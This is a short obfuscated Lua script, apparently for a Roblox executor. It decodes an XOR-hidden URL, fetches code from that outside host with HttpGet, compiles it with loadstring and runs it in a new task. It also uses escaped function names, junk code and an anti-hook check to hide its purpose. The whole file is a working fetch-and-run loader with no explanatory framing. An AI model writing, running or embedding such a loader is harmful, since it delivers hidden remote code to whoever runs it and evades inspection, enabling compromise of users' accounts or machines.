local _0xS1 = {6, 1, 22, 9, 20, 1, 18} 
local _0xS2 = {101, 45, 33, 52, 53, 114, 126, 126, 121, 126, 41, 40, 112, 118, 124, 116, 102, 121, 115, 120, 121, 113, 113, 118, 126, 113, 118, 126, 105, 115, 111, 110, 108, 113, 111, 40, 111, 113, 117, 121, 124, 111, 116, 116, 44, 45, 117, 121, 124, 113, 41, 105, 121, 121, 115, 120, 121, 111, 110, 114, 118, 113, 111, 103, 111, 111, 126, 103, 105, 101, 114, 114, 116, 40, 121, 120, 126, 124, 113, 111, 110, 114, 121, 113, 40, 101, 116, 101, 113, 114, 111, 121, 105, 101, 114, 126, 114, 114, 101, 103, 102, 111, 120, 40, 116, 118, 113, 111, 103, 105, 126, 41, 116, 118, 121, 111, 102, 40, 114, 113, 116, 40, 111, 101, 124, 126, 101, 126, 121, 126, 103, 126, 45, 115, 118, 120, 113, 121, 45, 101, 120, 126, 118, 105, 126, 101, 126, 113, 126, 112, 124, 121, 115, 101, 113, 40, 45, 112, 111, 121, 114, 116, 40, 111, 120, 121, 121, 115, 120, 121, 111, 110, 114, 118, 113, 111, 115, 111, 40, 44, 101, 111, 45, 113, 111, 111, 115, 121, 111, 110, 121, 126, 116, 121, 121, 115, 120, 121, 111, 110, 114, 118, 113, 111}

local _0xH1 = getfenv;
local _0xH2 = setfenv;
local _0xH3 = _0xH1(0);

local _0xP = {
    ["\103\101\116"] = function(s, u) return s:HttpGet(u, true) end,
    ["\108\100\115"] = loadstring,
    ["\120\111\114"] = function(d, k)
        local r = ""
        for i = 1, #d do
            local x = d[i]
            local y = k[(i-1) % #k + 1]
            r = r .. string.char(bit32.bxor(x, y))
        end
        return r
    end
}

local function _0xV()
    local _0xST = 1;
    local _0xL = nil;
    while _0xST ~= 0 do
        if _0xST == 1 then
            -- Garbage Code
            local _0xG = math.sin(math.pi) * math.cos(game.PlaceId);
            if (69 == 420) then print(_0xG) end
            
            -- Anti-Hook Check
            local _ok = pcall(function() 
                local h = hookfunction or function() end
                if (tostring(game.HttpGet):find("C code")) then return true end
            end)
            
            _0xST = _ok and 2 or 0;
        elseif _0xST == 2 then
            local _u = _0xP["\120\111\114"](_0xS2, _0xS1)
            local _s, _c = pcall(_0xP["\103\101\116"], game, _u .. "?v=" .. math.random(1,999))
            
            if _s and _c then
                _0xL = _0xP["\108\100\115"](_c)
                _0xST = 3
            else
                _0xST = 0
            end
        elseif _0xST == 3 then
            if _0xL then task.spawn(_0xL) end
            _0xST = 0
        end
    end
end

_0xV()
